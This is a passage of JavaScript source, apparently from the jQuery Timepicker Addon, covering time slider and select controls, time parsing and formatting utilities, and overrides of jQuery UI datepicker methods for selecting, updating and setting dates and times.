						'millisec',
						this.millisec -
							( this.millisec % this._defaults.stepMillisec )
					);
				}
				if ( this.microsec_slider ) {
					this.control.options(
						this,
						this.microsec_slider,
						'microsec',
						{
							min: this._defaults.microsecMin,
							max: microsecMax,
							step: this._defaults.stepMicrosec,
						}
					);
					this.control.value(
						this,
						this.microsec_slider,
						'microsec',
						this.microsec -
							( this.microsec % this._defaults.stepMicrosec )
					);
				}
			}
		},

		/*
		 * when a slider moves, set the internal time...
		 * on time change is also called when the time is updated in the text field
		 */
		_onTimeChange: function () {
			if ( ! this._defaults.showTimepicker ) {
				return;
			}
			var hour = this.hour_slider
					? this.control.value( this, this.hour_slider, 'hour' )
					: false,
				minute = this.minute_slider
					? this.control.value( this, this.minute_slider, 'minute' )
					: false,
				second = this.second_slider
					? this.control.value( this, this.second_slider, 'second' )
					: false,
				millisec = this.millisec_slider
					? this.control.value(
							this,
							this.millisec_slider,
							'millisec'
					  )
					: false,
				microsec = this.microsec_slider
					? this.control.value(
							this,
							this.microsec_slider,
							'microsec'
					  )
					: false,
				timezone = this.timezone_select
					? this.timezone_select.val()
					: false,
				o = this._defaults,
				pickerTimeFormat = o.pickerTimeFormat || o.timeFormat,
				pickerTimeSuffix = o.pickerTimeSuffix || o.timeSuffix;

			if ( typeof hour === 'object' ) {
				hour = false;
			}
			if ( typeof minute === 'object' ) {
				minute = false;
			}
			if ( typeof second === 'object' ) {
				second = false;
			}
			if ( typeof millisec === 'object' ) {
				millisec = false;
			}
			if ( typeof microsec === 'object' ) {
				microsec = false;
			}
			if ( typeof timezone === 'object' ) {
				timezone = false;
			}

			if ( hour !== false ) {
				hour = parseInt( hour, 10 );
			}
			if ( minute !== false ) {
				minute = parseInt( minute, 10 );
			}
			if ( second !== false ) {
				second = parseInt( second, 10 );
			}
			if ( millisec !== false ) {
				millisec = parseInt( millisec, 10 );
			}
			if ( microsec !== false ) {
				microsec = parseInt( microsec, 10 );
			}
			if ( timezone !== false ) {
				timezone = timezone.toString();
			}

			var ampm = o[ hour < 12 ? 'amNames' : 'pmNames' ][ 0 ];

			// If the update was done in the input field, the input field should not be updated.
			// If the update was done using the sliders, update the input field.
			var hasChanged =
				hour !== parseInt( this.hour, 10 ) || // sliders should all be numeric
				minute !== parseInt( this.minute, 10 ) ||
				second !== parseInt( this.second, 10 ) ||
				millisec !== parseInt( this.millisec, 10 ) ||
				microsec !== parseInt( this.microsec, 10 ) ||
				( this.ampm.length > 0 &&
					hour < 12 !==
						( $.inArray( this.ampm.toUpperCase(), this.amNames ) !==
							-1 ) ) ||
				( this.timezone !== null &&
					timezone !== this.timezone.toString() ); // could be numeric or "EST" format, so use toString()

			if ( hasChanged ) {
				if ( hour !== false ) {
					this.hour = hour;
				}
				if ( minute !== false ) {
					this.minute = minute;
				}
				if ( second !== false ) {
					this.second = second;
				}
				if ( millisec !== false ) {
					this.millisec = millisec;
				}
				if ( microsec !== false ) {
					this.microsec = microsec;
				}
				if ( timezone !== false ) {
					this.timezone = timezone;
				}

				if ( ! this.inst ) {
					this.inst = $.datepicker._getInst( this.$input[ 0 ] );
				}

				this._limitMinMaxDateTime( this.inst, true );
			}
			if ( this.support.ampm ) {
				this.ampm = ampm;
			}

			// Updates the time within the timepicker
			this.formattedTime = $.datepicker.formatTime(
				o.timeFormat,
				this,
				o
			);
			if ( this.$timeObj ) {
				if ( pickerTimeFormat === o.timeFormat ) {
					this.$timeObj.val( this.formattedTime + pickerTimeSuffix );
				} else {
					this.$timeObj.val(
						$.datepicker.formatTime( pickerTimeFormat, this, o ) +
							pickerTimeSuffix
					);
				}
				/*
				// Input loses focus when typing with picker open
				// https://github.com/trentrichardson/jQuery-Timepicker-Addon/issues/848
				if (this.$timeObj[0].setSelectionRange) {
					var sPos = this.$timeObj[0].selectionStart;
					var ePos = this.$timeObj[0].selectionEnd;
					this.$timeObj[0].setSelectionRange(sPos, ePos);
				}
				*/
			}

			this.timeDefined = true;
			if ( hasChanged ) {
				this._updateDateTime();
				//this.$input.focus(); // may automatically open the picker on setDate
			}
		},

		/*
		 * call custom onSelect.
		 * bind to sliders slidestop, and grid click.
		 */
		_onSelectHandler: function () {
			var onSelect =
				this._defaults.onSelect || this.inst.settings.onSelect;
			var inputEl = this.$input ? this.$input[ 0 ] : null;
			if ( onSelect && inputEl ) {
				onSelect.apply( inputEl, [ this.formattedDateTime, this ] );
			}
		},

		/*
		 * update our input with the new date time..
		 */
		_updateDateTime: function ( dp_inst ) {
			dp_inst = this.inst || dp_inst;
			var dtTmp =
					dp_inst.currentYear > 0
						? new Date(
								dp_inst.currentYear,
								dp_inst.currentMonth,
								dp_inst.currentDay
						  )
						: new Date(
								dp_inst.selectedYear,
								dp_inst.selectedMonth,
								dp_inst.selectedDay
						  ),
				dt = $.datepicker._daylightSavingAdjust( dtTmp ),
				//dt = $.datepicker._daylightSavingAdjust(new Date(dp_inst.selectedYear, dp_inst.selectedMonth, dp_inst.selectedDay)),
				//dt = $.datepicker._daylightSavingAdjust(new Date(dp_inst.currentYear, dp_inst.currentMonth, dp_inst.currentDay)),
				dateFmt = $.datepicker._get( dp_inst, 'dateFormat' ),
				formatCfg = $.datepicker._getFormatConfig( dp_inst ),
				timeAvailable = dt !== null && this.timeDefined;
			this.formattedDate = $.datepicker.formatDate(
				dateFmt,
				dt === null ? new Date() : dt,
				formatCfg
			);
			var formattedDateTime = this.formattedDate;

			// if a slider was changed but datepicker doesn't have a value yet, set it
			if ( dp_inst.lastVal === '' ) {
				dp_inst.currentYear = dp_inst.selectedYear;
				dp_inst.currentMonth = dp_inst.selectedMonth;
				dp_inst.currentDay = dp_inst.selectedDay;
			}

			/*
			 * remove following lines to force every changes in date picker to change the input value
			 * Bug descriptions: when an input field has a default value, and click on the field to pop up the date picker.
			 * If the user manually empty the value in the input field, the date picker will never change selected value.
			 */
			//if (dp_inst.lastVal !== undefined && (dp_inst.lastVal.length > 0 && this.$input.val().length === 0)) {
			//	return;
			//}

			if (
				this._defaults.timeOnly === true &&
				this._defaults.timeOnlyShowDate === false
			) {
				formattedDateTime = this.formattedTime;
			} else if (
				( this._defaults.timeOnly !== true &&
					( this._defaults.alwaysSetTime || timeAvailable ) ) ||
				( this._defaults.timeOnly === true &&
					this._defaults.timeOnlyShowDate === true )
			) {
				formattedDateTime +=
					this._defaults.separator +
					this.formattedTime +
					this._defaults.timeSuffix;
			}

			this.formattedDateTime = formattedDateTime;

			if ( ! this._defaults.showTimepicker ) {
				this.$input.val( this.formattedDate );
			} else if (
				this.$altInput &&
				this._defaults.timeOnly === false &&
				this._defaults.altFieldTimeOnly === true
			) {
				this.$altInput.val( this.formattedTime );
				this.$input.val( this.formattedDate );
			} else if ( this.$altInput ) {
				this.$input.val( formattedDateTime );
				var altFormattedDateTime = '',
					altSeparator =
						this._defaults.altSeparator !== null
							? this._defaults.altSeparator
							: this._defaults.separator,
					altTimeSuffix =
						this._defaults.altTimeSuffix !== null
							? this._defaults.altTimeSuffix
							: this._defaults.timeSuffix;

				if ( ! this._defaults.timeOnly ) {
					if ( this._defaults.altFormat ) {
						altFormattedDateTime = $.datepicker.formatDate(
							this._defaults.altFormat,
							dt === null ? new Date() : dt,
							formatCfg
						);
					} else {
						altFormattedDateTime = this.formattedDate;
					}

					if ( altFormattedDateTime ) {
						altFormattedDateTime += altSeparator;
					}
				}

				if ( this._defaults.altTimeFormat !== null ) {
					altFormattedDateTime +=
						$.datepicker.formatTime(
							this._defaults.altTimeFormat,
							this,
							this._defaults
						) + altTimeSuffix;
				} else {
					altFormattedDateTime += this.formattedTime + altTimeSuffix;
				}
				this.$altInput.val( altFormattedDateTime );
			} else {
				this.$input.val( formattedDateTime );
			}

			this.$input.trigger( 'change' );
		},

		_onFocus: function () {
			if ( ! this.$input.val() && this._defaults.defaultValue ) {
				this.$input.val( this._defaults.defaultValue );
				var inst = $.datepicker._getInst( this.$input.get( 0 ) ),
					tp_inst = $.datepicker._get( inst, 'timepicker' );
				if ( tp_inst ) {
					if (
						tp_inst._defaults.timeOnly &&
						inst.input.val() !== inst.lastVal
					) {
						try {
							$.datepicker._updateDatepicker( inst );
						} catch ( err ) {
							$.timepicker.log( err );
						}
					}
				}
			}
		},

		/*
		 * Small abstraction to control types
		 * We can add more, just be sure to follow the pattern: create, options, value
		 */
		_controls: {
			// slider methods
			slider: {
				create: function ( tp_inst, obj, unit, val, min, max, step ) {
					var rtl = tp_inst._defaults.isRTL; // if rtl go -60->0 instead of 0->60
					return obj.prop( 'slide', null ).slider( {
						orientation: 'horizontal',
						value: rtl ? val * -1 : val,
						min: rtl ? max * -1 : min,
						max: rtl ? min * -1 : max,
						step: step,
						slide: function ( event, ui ) {
							tp_inst.control.value(
								tp_inst,
								$( this ),
								unit,
								rtl ? ui.value * -1 : ui.value
							);
							tp_inst._onTimeChange();
						},
						stop: function ( event, ui ) {
							tp_inst._onSelectHandler();
						},
					} );
				},
				options: function ( tp_inst, obj, unit, opts, val ) {
					if ( tp_inst._defaults.isRTL ) {
						if ( typeof opts === 'string' ) {
							if ( opts === 'min' || opts === 'max' ) {
								if ( val !== undefined ) {
									return obj.slider( opts, val * -1 );
								}
								return Math.abs( obj.slider( opts ) );
							}
							return obj.slider( opts );
						}
						var min = opts.min,
							max = opts.max;
						opts.min = opts.max = null;
						if ( min !== undefined ) {
							opts.max = min * -1;
						}
						if ( max !== undefined ) {
							opts.min = max * -1;
						}
						return obj.slider( opts );
					}
					if ( typeof opts === 'string' && val !== undefined ) {
						return obj.slider( opts, val );
					}
					return obj.slider( opts );
				},
				value: function ( tp_inst, obj, unit, val ) {
					if ( tp_inst._defaults.isRTL ) {
						if ( val !== undefined ) {
							return obj.slider( 'value', val * -1 );
						}
						return Math.abs( obj.slider( 'value' ) );
					}
					if ( val !== undefined ) {
						return obj.slider( 'value', val );
					}
					return obj.slider( 'value' );
				},
			},
			// select methods
			select: {
				create: function ( tp_inst, obj, unit, val, min, max, step ) {
					var sel =
							'<select class="ui-timepicker-select ui-state-default ui-corner-all" data-unit="' +
							unit +
							'" data-min="' +
							min +
							'" data-max="' +
							max +
							'" data-step="' +
							step +
							'">',
						format =
							tp_inst._defaults.pickerTimeFormat ||
							tp_inst._defaults.timeFormat;

					for ( var i = min; i <= max; i += step ) {
						sel +=
							'<option value="' +
							i +
							'"' +
							( i === val ? ' selected' : '' ) +
							'>';
						if ( unit === 'hour' ) {
							sel += $.datepicker.formatTime(
								$.trim( format.replace( /[^ht ]/gi, '' ) ),
								{ hour: i },
								tp_inst._defaults
							);
						} else if (
							unit === 'millisec' ||
							unit === 'microsec' ||
							i >= 10
						) {
							sel += i;
						} else {
							sel += '0' + i.toString();
						}
						sel += '</option>';
					}
					sel += '</select>';

					obj.children( 'select' ).remove();

					$( sel )
						.appendTo( obj )
						.change( function ( e ) {
							tp_inst._onTimeChange();
							tp_inst._onSelectHandler();
							tp_inst._afterInject();
						} );

					return obj;
				},
				options: function ( tp_inst, obj, unit, opts, val ) {
					var o = {},
						$t = obj.children( 'select' );
					if ( typeof opts === 'string' ) {
						if ( val === undefined ) {
							return $t.data( opts );
						}
						o[ opts ] = val;
					} else {
						o = opts;
					}
					return tp_inst.control.create(
						tp_inst,
						obj,
						$t.data( 'unit' ),
						$t.val(),
						o.min >= 0 ? o.min : $t.data( 'min' ),
						o.max || $t.data( 'max' ),
						o.step || $t.data( 'step' )
					);
				},
				value: function ( tp_inst, obj, unit, val ) {
					var $t = obj.children( 'select' );
					if ( val !== undefined ) {
						return $t.val( val );
					}
					return $t.val();
				},
			},
		}, // end _controls
	} );

	$.fn.extend( {
		/*
		 * shorthand just to use timepicker.
		 */
		timepicker: function ( o ) {
			o = o || {};
			var tmp_args = Array.prototype.slice.call( arguments );

			if ( typeof o === 'object' ) {
				tmp_args[ 0 ] = $.extend( o, {
					timeOnly: true,
				} );
			}

			return $( this ).each( function () {
				$.fn.datetimepicker.apply( $( this ), tmp_args );
			} );
		},

		/*
		 * extend timepicker to datepicker
		 */
		datetimepicker: function ( o ) {
			o = o || {};
			var tmp_args = arguments;

			if ( typeof o === 'string' ) {
				if (
					o === 'getDate' ||
					( o === 'option' &&
						tmp_args.length === 2 &&
						typeof tmp_args[ 1 ] === 'string' )
				) {
					return $.fn.datepicker.apply( $( this[ 0 ] ), tmp_args );
				} else {
					return this.each( function () {
						var $t = $( this );
						$t.datepicker.apply( $t, tmp_args );
					} );
				}
			} else {
				return this.each( function () {
					var $t = $( this );
					$t.datepicker( $.timepicker._newInst( $t, o )._defaults );
				} );
			}
		},
	} );

	/*
	 * Public Utility to parse date and time
	 */
	$.datepicker.parseDateTime = function (
		dateFormat,
		timeFormat,
		dateTimeString,
		dateSettings,
		timeSettings
	) {
		var parseRes = parseDateTimeInternal(
			dateFormat,
			timeFormat,
			dateTimeString,
			dateSettings,
			timeSettings
		);
		if ( parseRes.timeObj ) {
			var t = parseRes.timeObj;
			parseRes.date.setHours( t.hour, t.minute, t.second, t.millisec );
			parseRes.date.setMicroseconds( t.microsec );
		}

		return parseRes.date;
	};

	/*
	 * Public utility to parse time
	 */
	$.datepicker.parseTime = function ( timeFormat, timeString, options ) {
		var o = extendRemove(
				extendRemove( {}, $.timepicker._defaults ),
				options || {}
			),
			iso8601 =
				timeFormat.replace( /\'.*?\'/g, '' ).indexOf( 'Z' ) !== -1;

		// Strict parse requires the timeString to match the timeFormat exactly
		var strictParse = function ( f, s, o ) {
			// pattern for standard and localized AM/PM markers
			var getPatternAmpm = function ( amNames, pmNames ) {
				var markers = [];
				if ( amNames ) {
					$.merge( markers, amNames );
				}
				if ( pmNames ) {
					$.merge( markers, pmNames );
				}
				markers = $.map( markers, function ( val ) {
					return val.replace( /[.*+?|()\[\]{}\\]/g, '\\$&' );
				} );
				return '(' + markers.join( '|' ) + ')?';
			};

			// figure out position of time elements.. cause js cant do named captures
			var getFormatPositions = function ( timeFormat ) {
				var finds = timeFormat
						.toLowerCase()
						.match(
							/(h{1,2}|m{1,2}|s{1,2}|l{1}|c{1}|t{1,2}|z|'.*?')/g
						),
					orders = {
						h: -1,
						m: -1,
						s: -1,
						l: -1,
						c: -1,
						t: -1,
						z: -1,
					};

				if ( finds ) {
					for ( var i = 0; i < finds.length; i++ ) {
						if (
							orders[ finds[ i ].toString().charAt( 0 ) ] === -1
						) {
							orders[ finds[ i ].toString().charAt( 0 ) ] = i + 1;
						}
					}
				}
				return orders;
			};

			var regstr =
					'^' +
					f
						.toString()
						.replace(
							/([hH]{1,2}|mm?|ss?|[tT]{1,2}|[zZ]|[lc]|'.*?')/g,
							function ( match ) {
								var ml = match.length;
								switch ( match.charAt( 0 ).toLowerCase() ) {
									case 'h':
										return ml === 1
											? '(\\d?\\d)'
											: '(\\d{' + ml + '})';
									case 'm':
										return ml === 1
											? '(\\d?\\d)'
											: '(\\d{' + ml + '})';
									case 's':
										return ml === 1
											? '(\\d?\\d)'
											: '(\\d{' + ml + '})';
									case 'l':
										return '(\\d?\\d?\\d)';
									case 'c':
										return '(\\d?\\d?\\d)';
									case 'z':
										return '(z|[-+]\\d\\d:?\\d\\d|\\S+)?';
									case 't':
										return getPatternAmpm(
											o.amNames,
											o.pmNames
										);
									default:
										// literal escaped in quotes
										return (
											'(' +
											match
												.replace( /\'/g, '' )
												.replace(
													/(\.|\$|\^|\\|\/|\(|\)|\[|\]|\?|\+|\*)/g,
													function ( m ) {
														return '\\' + m;
													}
												) +
											')?'
										);
								}
							}
						)
						.replace( /\s/g, '\\s?' ) +
					o.timeSuffix +
					'$',
				order = getFormatPositions( f ),
				ampm = '',
				treg;

			treg = s.match( new RegExp( regstr, 'i' ) );

			var resTime = {
				hour: 0,
				minute: 0,
				second: 0,
				millisec: 0,
				microsec: 0,
			};

			if ( treg ) {
				if ( order.t !== -1 ) {
					if (
						treg[ order.t ] === undefined ||
						treg[ order.t ].length === 0
					) {
						ampm = '';
						resTime.ampm = '';
					} else {
						ampm =
							$.inArray(
								treg[ order.t ].toUpperCase(),
								$.map( o.amNames, function ( x, i ) {
									return x.toUpperCase();
								} )
							) !== -1
								? 'AM'
								: 'PM';
						resTime.ampm =
							o[ ampm === 'AM' ? 'amNames' : 'pmNames' ][ 0 ];
					}
				}

				if ( order.h !== -1 ) {
					if ( ampm === 'AM' && treg[ order.h ] === '12' ) {
						resTime.hour = 0; // 12am = 0 hour
					} else {
						if ( ampm === 'PM' && treg[ order.h ] !== '12' ) {
							resTime.hour = parseInt( treg[ order.h ], 10 ) + 12; // 12pm = 12 hour, any other pm = hour + 12
						} else {
							resTime.hour = Number( treg[ order.h ] );
						}
					}
				}

				if ( order.m !== -1 ) {
					resTime.minute = Number( treg[ order.m ] );
				}
				if ( order.s !== -1 ) {
					resTime.second = Number( treg[ order.s ] );
				}
				if ( order.l !== -1 ) {
					resTime.millisec = Number( treg[ order.l ] );
				}
				if ( order.c !== -1 ) {
					resTime.microsec = Number( treg[ order.c ] );
				}
				if ( order.z !== -1 && treg[ order.z ] !== undefined ) {
					resTime.timezone = $.timepicker.timezoneOffsetNumber(
						treg[ order.z ]
					);
				}

				return resTime;
			}
			return false;
		}; // end strictParse

		// First try JS Date, if that fails, use strictParse
		var looseParse = function ( f, s, o ) {
			try {
				var d = new Date( '2012-01-01 ' + s );
				if ( isNaN( d.getTime() ) ) {
					d = new Date( '2012-01-01T' + s );
					if ( isNaN( d.getTime() ) ) {
						d = new Date( '01/01/2012 ' + s );
						if ( isNaN( d.getTime() ) ) {
							throw 'Unable to parse time with native Date: ' + s;
						}
					}
				}

				return {
					hour: d.getHours(),
					minute: d.getMinutes(),
					second: d.getSeconds(),
					millisec: d.getMilliseconds(),
					microsec: d.getMicroseconds(),
					timezone: d.getTimezoneOffset() * -1,
				};
			} catch ( err ) {
				try {
					return strictParse( f, s, o );
				} catch ( err2 ) {
					$.timepicker.log(
						'Unable to parse \ntimeString: ' +
							s +
							'\ntimeFormat: ' +
							f
					);
				}
			}
			return false;
		}; // end looseParse

		if ( typeof o.parse === 'function' ) {
			return o.parse( timeFormat, timeString, o );
		}
		if ( o.parse === 'loose' ) {
			return looseParse( timeFormat, timeString, o );
		}
		return strictParse( timeFormat, timeString, o );
	};

	/**
	 * Public utility to format the time
	 * @param {string} format format of the time
	 * @param {Object} time Object not a Date for timezones
	 * @param {Object} [options] essentially the regional[].. amNames, pmNames, ampm
	 * @returns {string} the formatted time
	 */
	$.datepicker.formatTime = function ( format, time, options ) {
		options = options || {};
		options = $.extend( {}, $.timepicker._defaults, options );
		time = $.extend(
			{
				hour: 0,
				minute: 0,
				second: 0,
				millisec: 0,
				microsec: 0,
				timezone: null,
			},
			time
		);

		var tmptime = format,
			ampmName = options.amNames[ 0 ],
			hour = parseInt( time.hour, 10 );

		if ( hour > 11 ) {
			ampmName = options.pmNames[ 0 ];
		}

		tmptime = tmptime.replace(
			/(?:HH?|hh?|mm?|ss?|[tT]{1,2}|[zZ]|[lc]|'.*?')/g,
			function ( match ) {
				switch ( match ) {
					case 'HH':
						return ( '0' + hour ).slice( -2 );
					case 'H':
						return hour;
					case 'hh':
						return ( '0' + convert24to12( hour ) ).slice( -2 );
					case 'h':
						return convert24to12( hour );
					case 'mm':
						return ( '0' + time.minute ).slice( -2 );
					case 'm':
						return time.minute;
					case 'ss':
						return ( '0' + time.second ).slice( -2 );
					case 's':
						return time.second;
					case 'l':
						return ( '00' + time.millisec ).slice( -3 );
					case 'c':
						return ( '00' + time.microsec ).slice( -3 );
					case 'z':
						return $.timepicker.timezoneOffsetString(
							time.timezone === null
								? options.timezone
								: time.timezone,
							false
						);
					case 'Z':
						return $.timepicker.timezoneOffsetString(
							time.timezone === null
								? options.timezone
								: time.timezone,
							true
						);
					case 'T':
						return ampmName.charAt( 0 ).toUpperCase();
					case 'TT':
						return ampmName.toUpperCase();
					case 't':
						return ampmName.charAt( 0 ).toLowerCase();
					case 'tt':
						return ampmName.toLowerCase();
					default:
						return match.replace( /'/g, '' );
				}
			}
		);

		return tmptime;
	};

	/*
	* the bad hack :/ override datepicker so it doesn't close on select
	// inspired: http://stackoverflow.com/questions/1252512/jquery-datepicker-prevent-closing-picker-when-clicking-a-date/1762378#1762378
	*/
	$.datepicker._base_selectDate = $.datepicker._selectDate;
	$.datepicker._selectDate = function ( id, dateStr ) {
		var inst = this._getInst( $( id )[ 0 ] ),
			tp_inst = this._get( inst, 'timepicker' ),
			was_inline;

		if ( tp_inst && inst.settings.showTimepicker ) {
			tp_inst._limitMinMaxDateTime( inst, true );
			was_inline = inst.inline;
			inst.inline = inst.stay_open = true;
			//This way the onSelect handler called from calendarpicker get the full dateTime
			this._base_selectDate( id, dateStr );
			inst.inline = was_inline;
			inst.stay_open = false;
			this._notifyChange( inst );
			this._updateDatepicker( inst );
		} else {
			this._base_selectDate( id, dateStr );
		}
	};

	/*
	 * second bad hack :/ override datepicker so it triggers an event when changing the input field
	 * and does not redraw the datepicker on every selectDate event
	 */
	$.datepicker._base_updateDatepicker = $.datepicker._updateDatepicker;
	$.datepicker._updateDatepicker = function ( inst ) {
		// don't popup the datepicker if there is another instance already opened
		var input = inst.input[ 0 ];
		if (
			$.datepicker._curInst &&
			$.datepicker._curInst !== inst &&
			$.datepicker._datepickerShowing &&
			$.datepicker._lastInput !== input
		) {
			return;
		}

		if ( typeof inst.stay_open !== 'boolean' || inst.stay_open === false ) {
			this._base_updateDatepicker( inst );

			// Reload the time control when changing something in the input text field.
			var tp_inst = this._get( inst, 'timepicker' );
			if ( tp_inst ) {
				tp_inst._addTimePicker( inst );
			}
		}
	};

	/*
	 * third bad hack :/ override datepicker so it allows spaces and colon in the input field
	 */
	$.datepicker._base_doKeyPress = $.datepicker._doKeyPress;
	$.datepicker._doKeyPress = function ( event ) {
		var inst = $.datepicker._getInst( event.target ),
			tp_inst = $.datepicker._get( inst, 'timepicker' );

		if ( tp_inst ) {
			if ( $.datepicker._get( inst, 'constrainInput' ) ) {
				var ampm = tp_inst.support.ampm,
					tz =
						tp_inst._defaults.showTimezone !== null
							? tp_inst._defaults.showTimezone
							: tp_inst.support.timezone,
					dateChars = $.datepicker._possibleChars(
						$.datepicker._get( inst, 'dateFormat' )
					),
					datetimeChars =
						tp_inst._defaults.timeFormat
							.toString()
							.replace( /[hms]/g, '' )
							.replace( /TT/g, ampm ? 'APM' : '' )
							.replace( /Tt/g, ampm ? 'AaPpMm' : '' )
							.replace( /tT/g, ampm ? 'AaPpMm' : '' )
							.replace( /T/g, ampm ? 'AP' : '' )
							.replace( /tt/g, ampm ? 'apm' : '' )
							.replace( /t/g, ampm ? 'ap' : '' ) +
						' ' +
						tp_inst._defaults.separator +
						tp_inst._defaults.timeSuffix +
						( tz
							? tp_inst._defaults.timezoneList.join( '' )
							: '' ) +
						tp_inst._defaults.amNames.join( '' ) +
						tp_inst._defaults.pmNames.join( '' ) +
						dateChars,
					chr = String.fromCharCode(
						event.charCode === undefined
							? event.keyCode
							: event.charCode
					);
				return (
					event.ctrlKey ||
					chr < ' ' ||
					! dateChars ||
					datetimeChars.indexOf( chr ) > -1
				);
			}
		}

		return $.datepicker._base_doKeyPress( event );
	};

	/*
	 * Fourth bad hack :/ override _updateAlternate function used in inline mode to init altField
	 * Update any alternate field to synchronise with the main field.
	 */
	$.datepicker._base_updateAlternate = $.datepicker._updateAlternate;
	$.datepicker._updateAlternate = function ( inst ) {
		var tp_inst = this._get( inst, 'timepicker' );
		if ( tp_inst ) {
			var altField = tp_inst._defaults.altField;
			if ( altField ) {
				// update alternate field too
				var altFormat =
						tp_inst._defaults.altFormat ||
						tp_inst._defaults.dateFormat,
					date = this._getDate( inst ),
					formatCfg = $.datepicker._getFormatConfig( inst ),
					altFormattedDateTime = '',
					altSeparator = tp_inst._defaults.altSeparator
						? tp_inst._defaults.altSeparator
						: tp_inst._defaults.separator,
					altTimeSuffix = tp_inst._defaults.altTimeSuffix
						? tp_inst._defaults.altTimeSuffix
						: tp_inst._defaults.timeSuffix,
					altTimeFormat =
						tp_inst._defaults.altTimeFormat !== null
							? tp_inst._defaults.altTimeFormat
							: tp_inst._defaults.timeFormat;

				altFormattedDateTime +=
					$.datepicker.formatTime(
						altTimeFormat,
						tp_inst,
						tp_inst._defaults
					) + altTimeSuffix;
				if (
					! tp_inst._defaults.timeOnly &&
					! tp_inst._defaults.altFieldTimeOnly &&
					date !== null
				) {
					if ( tp_inst._defaults.altFormat ) {
						altFormattedDateTime =
							$.datepicker.formatDate(
								tp_inst._defaults.altFormat,
								date,
								formatCfg
							) +
							altSeparator +
							altFormattedDateTime;
					} else {
						altFormattedDateTime =
							tp_inst.formattedDate +
							altSeparator +
							altFormattedDateTime;
					}
				}
				$( altField ).val(
					inst.input.val() ? altFormattedDateTime : ''
				);
			}
		} else {
			$.datepicker._base_updateAlternate( inst );
		}
	};

	/*
	 * Override key up event to sync manual input changes.
	 */
	$.datepicker._base_doKeyUp = $.datepicker._doKeyUp;
	$.datepicker._doKeyUp = function ( event ) {
		var inst = $.datepicker._getInst( event.target ),
			tp_inst = $.datepicker._get( inst, 'timepicker' );

		if ( tp_inst ) {
			if (
				tp_inst._defaults.timeOnly &&
				inst.input.val() !== inst.lastVal
			) {
				try {
					$.datepicker._updateDatepicker( inst );
				} catch ( err ) {
					$.timepicker.log( err );
				}
			}
		}

		return $.datepicker._base_doKeyUp( event );
	};

	/*
	 * override "Today" button to also grab the time and set it to input field.
	 */
	$.datepicker._base_gotoToday = $.datepicker._gotoToday;
	$.datepicker._gotoToday = function ( id ) {
		var inst = this._getInst( $( id )[ 0 ] );
		this._base_gotoToday( id );
		var tp_inst = this._get( inst, 'timepicker' );
		if ( ! tp_inst ) {
			return;
		}

		var tzoffset = $.timepicker.timezoneOffsetNumber( tp_inst.timezone );
		var now = new Date();
		now.setMinutes(
			now.getMinutes() +
				now.getTimezoneOffset() +
				parseInt( tzoffset, 10 )
		);
		this._setTime( inst, now );
		this._setDate( inst, now );
		tp_inst._onSelectHandler();
	};

	/*
	 * Disable & enable the Time in the datetimepicker
	 */
	$.datepicker._disableTimepickerDatepicker = function ( target ) {
		var inst = this._getInst( target );
		if ( ! inst ) {
			return;
		}

		var tp_inst = this._get( inst, 'timepicker' );
		$( target ).datepicker( 'getDate' ); // Init selected[Year|Month|Day]
		if ( tp_inst ) {
			inst.settings.showTimepicker = false;
			tp_inst._defaults.showTimepicker = false;
			tp_inst._updateDateTime( inst );
		}
	};

	$.datepicker._enableTimepickerDatepicker = function ( target ) {
		var inst = this._getInst( target );
		if ( ! inst ) {
			return;
		}

		var tp_inst = this._get( inst, 'timepicker' );
		$( target ).datepicker( 'getDate' ); // Init selected[Year|Month|Day]
		if ( tp_inst ) {
			inst.settings.showTimepicker = true;
			tp_inst._defaults.showTimepicker = true;
			tp_inst._addTimePicker( inst ); // Could be disabled on page load
			tp_inst._updateDateTime( inst );
		}
	};

	/*
	 * Create our own set time function
	 */
	$.datepicker._setTime = function ( inst, date ) {
		var tp_inst = this._get( inst, 'timepicker' );
		if ( tp_inst ) {
			var defaults = tp_inst._defaults;

			// calling _setTime with no date sets time to defaults
			tp_inst.hour = date ? date.getHours() : defaults.hour;
			tp_inst.minute = date ? date.getMinutes() : defaults.minute;
			tp_inst.second = date ? date.getSeconds() : defaults.second;
			tp_inst.millisec = date
				? date.getMilliseconds()
				: defaults.millisec;
			tp_inst.microsec = date
				? date.getMicroseconds()
				: defaults.microsec;

			//check if within min/max times..
			tp_inst._limitMinMaxDateTime( inst, true );

			tp_inst._onTimeChange();
			tp_inst._updateDateTime( inst );
		}
	};

	/*
	 * Create new public method to set only time, callable as $().datepicker('setTime', date)
	 */
	$.datepicker._setTimeDatepicker = function ( target, date, withDate ) {
		var inst = this._getInst( target );
		if ( ! inst ) {
			return;
		}

		var tp_inst = this._get( inst, 'timepicker' );

		if ( tp_inst ) {
			this._setDateFromField( inst );
			var tp_date;
			if ( date ) {
				if ( typeof date === 'string' ) {
					tp_inst._parseTime( date, withDate );
					tp_date = new Date();
					tp_date.setHours(
						tp_inst.hour,
						tp_inst.minute,
						tp_inst.second,
						tp_inst.millisec
					);
					tp_date.setMicroseconds( tp_inst.microsec );
				} else {
					tp_date = new Date( date.getTime() );
					tp_date.setMicroseconds( date.getMicroseconds() );
				}
				if ( tp_date.toString() === 'Invalid Date' ) {
					tp_date = undefined;
				}
				this._setTime( inst, tp_date );
			}
		}
	};

	/*
	 * override setDate() to allow setting time too within Date object
	 */
	$.datepicker._base_setDateDatepicker = $.datepicker._setDateDatepicker;
	$.datepicker._setDateDatepicker = function ( target, _date ) {
		var inst = this._getInst( target );
		var date = _date;
		if ( ! inst ) {
			return;
		}

		if ( typeof _date === 'string' ) {
			date = new Date( _date );
			if ( ! date.getTime() ) {
				this._base_setDateDatepicker.apply( this, arguments );
				date = $( target ).datepicker( 'getDate' );
			}
		}

		var tp_inst = this._get( inst, 'timepicker' );
		var tp_date;
		if ( date instanceof Date ) {
			tp_date = new Date( date.getTime() );
			tp_date.setMicroseconds( date.getMicroseconds() );
		} else {
			tp_date = date;
		}

		// This is important if you are using the timezone option, javascript's Date
		// object will only return the timezone offset for the current locale, so we
		// adjust it accordingly.  If not using timezone option this won't matter..
		// If a timezone is different in tp, keep the timezone as is
		if ( tp_inst && tp_date ) {
			// look out for DST if tz wasn't specified
			if (
				! tp_inst.support.timezone &&
				tp_inst._defaults.timezone === null
			) {
				tp_inst.timezone = tp_date.getTimezoneOffset() * -1;
			}
			date = $.timepicker.timezoneAdjust(
				date,
				$.timepicker.timezoneOffsetString( -date.getTimezoneOffset() ),
				tp_inst.timezone
			);
			tp_date = $.timepicker.timezoneAdjust(
				tp_date,
				$.timepicker.timezoneOffsetString(
					-tp_date.getTimezoneOffset()
				),
				tp_inst.timezone
			);
		}

